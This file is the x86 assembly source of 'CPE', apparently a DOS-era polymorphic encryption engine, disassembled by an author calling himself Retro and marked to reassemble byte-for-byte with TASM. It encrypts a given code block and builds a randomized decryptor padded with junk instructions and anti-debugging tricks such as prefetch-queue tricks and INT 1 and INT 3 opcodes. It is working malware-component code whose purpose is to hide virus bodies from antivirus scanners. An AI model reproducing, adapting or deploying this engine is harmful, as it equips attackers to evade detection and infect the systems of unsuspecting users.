; CPE DISASSEMBLY BY RETRO (retro@pcscav.com)
; COMPILE WITH TASM FOR BYTE MATCH
;ON CALLING CPE :
; DS:SI = code to encrypt
; CX    = size
; AX    = upper limit of decryptor size
; BX    = lower limit of decryptor size
; BP    = run time offset
; CS:DI = buffer
;
; DS MUST EQUAL CS!

cpe: 		mov	bufferloc, di
		mov	runip, bp
		mov	d_directkeyloc,	0
		mov	encryptor, 0C3h
		mov	codesize, cx
		push	cs
		pop	es
		sub	ax, bx
		call	random_ax
		add	ax, bx
		mov	decryptorsize, ax
		add	di, ax
		rep movsb
		mov	ax, 2
		call	random_ax
		mov	which_registers, ax
		mov	ax, 5
		call	random_ax
		add	al, 0Ah		; al = 0a - 0e
		mov	cx, decryptorsize
		xchg	ax, cx
		div	cl
		sub	cl, 4
		mov	crypt_op_count,	cl
		xor	ah, ah
		mov	max_garbage, ax
		mov	al, 3
		call	random_ax
		inc	al
		or	dec_counter, al
		mov	counter, al
		call	getgarbagecount
		mov	di, bufferloc
		call	makegarbage
		mov	bx, offset registers
		add	bx, which_registers
		mov	al, [bx]
		mov	keyreg,	al
		mov	dl, [bx+2]
		mov	pointer, dl
		mov	bp, decryptorsize
		add	bp, runip
		call	getgarbagecount
		call	generate_move
		mov	dl, counter
		mov	bp, codesize
		call	getgarbagecount
		shr	cx, 1
		call	generate_move
		mov	inloop,	1
		mov	loop_start, di
		call	getgarbagecount
		shr	cx, 1
		call	makegarbage
		mov	cl, crypt_op_count
		xor	ch, ch
make_crypt_ops_loop:
		push	cx
		call	make_crypt_ops
		call	getgarbagecount
		call	makegarbage
		pop	cx
		loop	make_crypt_ops_loop
		mov	al, 40h
		or	al, pointer
		stosb
		call	getgarbagecount
		call	makegarbage
		mov	cx, di
		sub	cx, loop_start
		inc	cx
		inc	cx
		push	si
		mov	si, offset dec_counter
		movsw
		movsw
		movsw
		pop	si
		add	cx, 4
		neg	cx
		mov	[di-2],	cx
                jmp     short exit_cpe
dec_counter     db 48h,74h,3,0E9h,0,0   ;DEC REG, JZ $+3, JMP DEC_START 

;*****
                mov     al, 0E2h        ; this code unused
		stosb
		xchg	al, cl
		neg	al
		stosb
;*****

exit_cpe:       mov     cx, decryptorsize
		add	cx, bufferloc
		sub	cx, di
		mov	inloop,	0
		call	makegarbage
		push	di
		mov	cx, codesize
		mov	bx, decryptorsize
		add	bx, bufferloc
		mov	al, pointer
		or	mov_pointer_bx,	al
		or	inc_pointer, al
		mov	ax, encryptor_loc
                jmp     short clearPIQ
clearPIQ:       db 89h                  ; MOV reg,BX
mov_pointer_bx	db 0D8h
encrypt_loop:   call    encryptor_loc
inc_pointer	db 40h
		loop	encrypt_loop
		pop	cx
		mov	dx, bufferloc
		sub	cx, dx
		add	cx, codesize
		mov	encryptor_loc, offset encryptor
		mov	al, 0F8h
		and	mov_pointer_bx,	al
		and	inc_pointer, al
		and	dec_counter, al
		retn	
registers       db    4  
                db    5  
                db    6  
                db    7  
make_crypt_ops: mov     ax, 7
		call	random_ax
		shl	ax, 2
		mov	si, offset crypt_ops
		add	si, ax
		mov	bx, encryptor_loc
		cmp	al, 14h
		ja	direct_key_mod
		mov	cx, [si]
		or	ch, keyreg
		mov	[di], cx
		mov	cx, [si+2]
		or	ch, keyreg
		scasw
		cmp	al, 0Ch
		jb	direct_key
		mov	[bx-2],	cx
		sub	encryptor_loc, 2
		retn	
direct_key:     mov     al, 0FFh
		call	random_ax
		mov	d_directkeyloc,	di
		mov	e_directkeyloc,	bx
		stosb
		mov	[bx-3],	cx
		mov	[bx-1],	al
		sub	encryptor_loc, 3
		retn	
direct_key_mod: cmp     d_directkeyloc, 0
		jz	no_directkey_encoded
		mov	ax, [si]
		stosw
		mov	ax, [si+2]
		mov	[bx-5],	ax
		mov	ax, d_directkeyloc
		add	ax, runip
		sub	ax, bufferloc
		stosw
		mov	ax, e_directkeyloc
		dec	ax
		mov	[bx-3],	ax
		mov	al, 0FFh
		call	random_ax
		stosb
		mov	[bx-1],	al
		sub	encryptor_loc, 5
		mov	d_directkeyloc,	0
no_directkey_encoded:
		retn	
crypt_ops       db 80h, 30h             ; XOR  \
                db 80h, 30h             ; XOR   \
                db 80h, 0               ; ADD    \ immediates.
                db 80h, 28h             ; SUB    /
                db 0C0h, 0              ; ROL   /
                db 0C0h, 8              ; ROR  /

                db 0D0h, 0              ; ROL  \
                db 0D0h, 8              ; ROR   \
                db 0F6h, 18h            ; NEG    \ nonimmediate.
                db 0F6h, 18h            ; NEG    / 
                db 0FEh, 0              ; INC   /
                db 0FEh, 8              ; DEC  /

                db 80h,	6		; KEY MODIFIERS. (ADD)
		db 80h,	6
generate_move:  mov     ax, 4
		call	random_ax
		mov	si, offset mov_tab
		xchg	al, ah
		aad	3
		add	si, ax
		lodsb
		shl	ax, 1
		add	ax, offset move_tab
		xchg	ax, bx
		call	word ptr [bx]
		retn	
move_tab	dw offset mov_regXXXX
		dw offset zeroreg_addxoror_regXXXX
mov_regXXXX:    movsw
		or	[di-1],	dl
		xchg	ax, bp
		stosw
		call	makegarbage
		retn	
zeroreg_addxoror_regXXXX:
		push	si
		push	dx
		mov	ax, 2
		call	random_ax
		shl	ax, 1
		add	ax, offset zeroreg_table
		xchg	ax, si
		movsw
		or	[di-1],	dl
		shl	dl, 3
		or	[di-1],	dl
		shr	cx, 1
		push	cx
		push	bp
		call	makegarbage
		pop	bp
		pop	cx
		pop	dx
		pop	si
		movsw
		or	[di-1],	dl
		xchg	ax, bp
		stosw
		call	makegarbage
		retn	
mov_tab		db 0, 0C7h, 0C0h
		db 1, 81h, 0C8h
		db 1, 81h, 0C0h
		db 1, 81h, 0F0h
zeroreg_table   db 29h, 0C0h            ; SUB reg,reg
		db 31h,	0C0h		; XOR reg,reg
getgarbagecount:mov     ax, max_garbage
		call	random_ax
		xchg	ax, cx
		retn	
makegarbage:    and     cx, cx
		jnz	wecangenerate
		retn	
wecangenerate:  mov     si, offset garbagetab
reset_dl:       mov     ax, 1Fh
		call	random_ax
		mov	dl, al
		inc	dl
getinfo:        mov     al, [si]
		cmp	al, 4Eh
		jnz	notendoftab
		mov	si, offset garbagetab
                jmp     short getinfo
notendoftab:    mov     dh, al
		and	al, 0Fh
		cbw	
		and	dl, dl
		jz	generatethis
		dec	dl
		shr	dh, 4
		add	al, dh
		add	si, ax
		inc	si
		inc	si
                jmp     short getinfo
generatethis:   push    cx
		sub	cx, ax
		test	ch, 80h
		pop	cx
		jnz	reset_dl
		mov	garb_remaining,	cx
		mov	bl, [si+1]
		cmp	jmpcond_disp, bl
		ja	reset_dl
		mov	bh, bl
		test	bl, 40h
		jnz	noloopcheck
		cmp	inloop,	1
		jz	reset_dl
noloopcheck:    push    ax
		mov	ax, 3Fh
		and	bl, al
		call	random_ax
		cmp	bl, al
		pop	ax
		jb	reset_dl
		inc	si
		push	si
		push	cx
		xor	bx, bx
		mov	bl, dh
		and	bl, 0F0h
		shr	bl, 4
		inc	bx
		mov	cx, ax
		push	si
		push	di
		add	si, bx
		rep movsb
		pop	di
		pop	si
		mov	cx, bx
		dec	cx
		jcxz	exit_garbage_generate
make_operands:  inc     si
		mov	al, [si]
		mov	dl, al
		and	al, 0Fh
		cbw	
		mov	bp, ax
		mov	al, dl
		and	al, 0F0h
		shr	al, 3
		mov	bx, ax
                add     bx, offset fixup_tab
		call	word ptr [bx]
		loop	make_operands
exit_garbage_generate:
		pop	cx
		pop	si
		mov	al, dh
		and	al, 0Fh
		cbw	
		shr	dh, 4
		sub	cx, ax
		add	di, ax
		add	al, dh
		add	si, ax
		inc	si
		mov	al, jmpcond_disp
		and	al, al
		jz	checkiffinished
		test	al, 80h
		jnz	checkiffinished
		add	cx, di
		mov	di, ofnouse
		sub	cx, di
		mov	jmpcond_disp, 0
checkiffinished:and     cx, cx
		jz	mov_ofnouse_di__ret
		jmp	reset_dl
mov_ofnouse_di__ret:
		mov	ofnouse, di
		retn	
fixup_tab       dw offset store_byte   ; store_bytes
		dw offset randomize_op_type_field
		dw offset insert_unused_reg
		dw offset insert_modrm
		dw offset insert_rm
		dw offset randomize_one_byte
		dw offset insert_modregrm
		dw offset fixjmptype_insertoffset
                dw offset store_word   ; store_bytes
		dw offset save_modrm_insert_reg
		dw offset insert_runtimeoffset
		dw offset set_rm_bits_to_inserted_reg
		dw offset set_reg_bits_to_inserted_reg
store_word:
store_byte:     mov     al, 0FFh
		call	random_ax
		mov	es:[bp+di], al
		test	dl, 80h		; which	call in	tab?
                jz      storing_byte    ; if z then storing word
		mov	al, 0FFh
		call	random_ax
		mov	es:[bp+di+1], al
storing_byte:   retn 
insert_mod:     mov     al, 0F0h
		call	random_ax
		and	al, 80h
		mov	ah, al
		shr	al, 1
		or	al, ah
		or	es:[bp+di], al
		retn	
insert_unused_reg:
		mov	al, 0F0h
		call	random_ax
		and	al, 7
		cmp	al, reg_sp
		jz	insert_unused_reg
		cmp	al, pointer
		jz	insert_unused_reg
		push	ax
		and	al, 3
		cmp	al, counter
		pop	ax
		jz	insert_unused_reg
		or	es:[bp+di], al
		mov	inserted_reg, al
		retn	
randomize_one_byte:
		mov	al, 6
		call	random_ax
		add	es:[bp+di], al
		retn	
insert_rm:      mov     al, 80h
		call	random_ax
		and	al, 7
		cmp	al, 6
		jz	insert_rm
		or	es:[bp+di], al
		retn	
insert_modrm:   call    insert_mod
		call	insert_rm
		retn	
insert_modregrm:call    insert_unused_reg
		shl	byte ptr es:[bp+di], 3
		call	insert_rm
		call	insert_mod
		retn	
randomize_op_type_field:
		mov	al, 0Fh
		call	random_ax
		shl	al, 3
		or	es:[bp+di], al
		call	insert_unused_reg
		retn	
fixjmptype_insertoffset:
		mov	al, 10h
		call	random_ax
		or	es:[bp+di-1], al
		mov	ax, garb_remaining
		dec	ax
		dec	ax
		call	random_ax
		and	ax, 3Fh
		mov	es:[bp+di], al
		cbw	
		pusha	
		mov	cx, ax		; cx=jmpdisp
		or	al, 80h
		mov	jmpcond_disp, al
		add	di, bp
		inc	di
		call	makegarbage
		and	jmpcond_disp, 7Fh
		popa	
		retn	
save_modrm_insert_reg:
		mov	bl, es:[bp+di]
		mov	byte ptr es:[bp+di], 0
		call	insert_unused_reg
		shl	byte ptr es:[bp+di], 3
		or	es:[bp+di], bl
		retn	
set_rm_bits_to_inserted_reg:
		mov	al, inserted_reg
		or	es:[bp+di], al
		retn	
insert_runtimeoffset:
		mov	ax, di
		sub	ax, bufferloc
		add	ax, runip
		add	es:[bp+di], ax
		retn	
set_reg_bits_to_inserted_reg:
		mov	al, inserted_reg
		shl	al, 3
		or	es:[bp+di], al
		retn	
comment !
                                ***NOTE***
garbage table structure like this:
          "fixups"  \  / opcode size
        size_byte db ??
        info_byte db ??  <- used for jmp conds.
                                  /  offset in fixup_tab * 2
                                 | / offset to fixup
        fixups    db fixups dup (??)
        opcode    db opcode size dup (?)
i'll use the first garb table entry as example.
      no of fixups \  / opcode size
garbagetab	db  23h
		db 0FFh
    "insert_modrm" \ / op + 1
                db  31h
      "store_byte" \ / op + 2
                db  02h
                -- opcode --  ( test modrm, immbyte )
        	db 0F6h
		db    0
		db    0

        !

garbagetab	db  23h
		db 0FFh
		db  31h
		db    2
		db 0F6h
		db    0
		db    0
onebyter	db  11h
		db 0FFh
		db  50h
		db 0F8h
rndjmp		db  12h
		db  7Fh
		db  71h
		db  70h
		db    0
arithmetic_ops  db  24h 
                db 0FFh  ÿ
                db  11h  
                db  82h 
                db  81h 
                db 0C0h 
                db    0  
                db    0  
dec_reg         db  11h  
                db 0FFh  ÿ
                db  20h   
                db  48h 
xchg_reg_reg    db  11h  
                db 0FFh  ÿ
                db  20h   
                db  90h 
rotate_shift    db  12h  
                db 0FFh  ÿ
                db  11h  
                db 0D1h 
                db 0C0h 
xchg_reg_reg2   db  11h  
                db 0FFh  ÿ
                db  20h   
                db  90h 
neg_reg         db  12h  
                db 0FFh  ÿ
                db  21h 
                db 0F7h 
                db 0D8h 
cmp_modregrm    db  12h  
                db 0FFh  ÿ
                db  61h 
                db  38h 
                db    0 
mov_reg_XXXX    db  23h 
                db 0FFh  ÿ
                db  20h   
                db  81h 
                db 0B8h 
                db    0  
                db    0  
inc_reg         db  11h  
                db 0FFh  ÿ
                db  20h   
                db  40h 
in_al_XX        db  12h  
                db 0FFh  ÿ
                db    1  
                db 0E4h 
                db    0  
mov_reg_byteptr db  24h 
                db 0FFh ÿ
                db  91h 
                db  82h 
                db  8Ah 
                db    6 
                db    0  
                db    0  
cmp_byte_imm    db  35h 
                db 0FFh  ÿ
                db  41h                 ; insert_rm
                db  82h                 ; store_word
                db    4                 ; store_byte
                db  80h 
                db 0B8h 
                db    0  
                db    0  
                db    0  
not_reg         db  12h  
                db 0FFh  ÿ
                db  21h 
                db 0F7h 
                db 0D0h 
or_modregrm     db  12h  
                db 0FFh  ÿ
                db  61h 
                db  0Ah  
                db    0  
prefetch_trick  db  5Dh 
                db  8Fh 
                db  20h                 ; insert_unused_reg
                db 0A1h                 ; insert_runtime_offset
                db 0A5h                 ; ""
                db 0B8h                 ; set_rm_bits..
                db 0B9h                 ; ""
                db 0B8h                 ; mov ax,offset $+9
                db  0Bh  
                db    0  
                db 0C7h                 ; mov [$+6],jmp_reg
                db    6  
                db  0Ah  
                db    0  
                db 0FFh  ÿ
                db 0E0h 
                db  40h                 ; inc reg
                db 0EBh                 ; jmp $-3
                db 0FDh 
                db 0CFh 
int_3           db    1 
                db 0D0h 
                db 0CCh 
do_jmpSSSSOOOO  db  5Dh 
                db 0C7h 
                db  21h 
                db 0C3h 
                db 0A4h 
                db 0A9h 
                db  8Bh 
                db  0Eh                 ; push cs
                db  58h                 ; pop ax
                db  89h                 ; mov [$+8],ax
                db    6  
                db  0Bh  
                db    0  
                db 0EBh                 ; jmp $+2
                db    0  
                db 0EAh                 ; jmp cs:$+5
                db  0Dh  
                db    0  
                db    0  
                db    0  
int_1           db    2  
                db 0D0h 
                db 0CDh 
                db    1  
end_tab         db  4Eh 
jmpcond_disp	db 0
		db 0			; WASTED BYTE
garb_remaining	dw 0
reg_sp		db 4
counter		db 81h
pointer		db 86h
                db 80h                  ; WASTED BYTE
ofnouse		dw 0
inserted_reg	db 0
inloop		db 0
initseeds:      pusha   
		mov	ah, 2Ch
		int	21h
		mov	cs:seedA, cx
		mov	cs:seedB, dx
		popa	
		retn	
random_ax:      pusha   
		call	random
		mov	bx, sp
		mov	cx, dx
		mul	word ptr ss:[bx+0Eh]
		mov	ax, cx
		mov	cx, dx
		mul	word ptr ss:[bx+0Eh]
		add	ax, cx
		adc	dx, 0
		mov	ss:[bx+0Eh], dx
		popa	
		retn	
random:		mov	ax, cs:seedA
		mov	bx, cs:seedB
		mov	cx, ax
		mul	cs:mulval
		shl	cx, 3
		add	ch, cl
		add	dx, cx
		add	dx, bx
		shl	bx, 2
		add	dx, bx
		add	dh, bl
		shl	bx, 5
		add	dh, bl
		add	ax, 1
		adc	dx, 0
		mov	cs:seedA, ax
		mov	cs:seedB, dx
		retn	
mulval		dw 8405h
seedA		dw 0
seedB		dw 0
encryptor_loc	dw offset encryptor
d_directkeyloc	dw 0
e_directkeyloc	dw 0
loop_start	dw 0
decryptorsize	dw 0
max_garbage	dw 0
		db 4 dup(0)		; WASTED DWORD
which_registers	dw 0
codesize	dw 0
crypt_op_count	db 0
keyreg		db 0
		db 2 dup(0)		; WASTED WORD
runip		dw 0
bufferloc	dw 0
		db 40h dup(0)
encryptor	db 0
end_cpe:

